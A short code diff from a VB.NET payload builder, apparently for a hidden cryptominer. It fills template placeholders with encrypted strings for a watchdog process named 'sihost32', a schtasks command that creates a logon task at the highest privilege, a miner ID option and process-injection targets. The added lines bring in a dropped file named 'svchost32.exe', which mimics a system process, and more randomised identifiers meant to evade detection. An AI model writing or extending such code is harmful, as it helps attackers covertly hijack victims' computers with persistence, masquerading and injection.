@@ -301,6 +301,7 @@ Public Class Codedom
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost32"))
         stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
         stringb.Replace("#MINERID", F.EncryptString("--cinit-find-e"))
+        stringb.Replace("#DROPFILE", F.EncryptString("svchost32.exe"))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
@@ -319,6 +320,7 @@ Public Class Codedom
         stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RProgram", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RExit", F.Randomi(F.rand.Next(5, 40)))
 
         stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
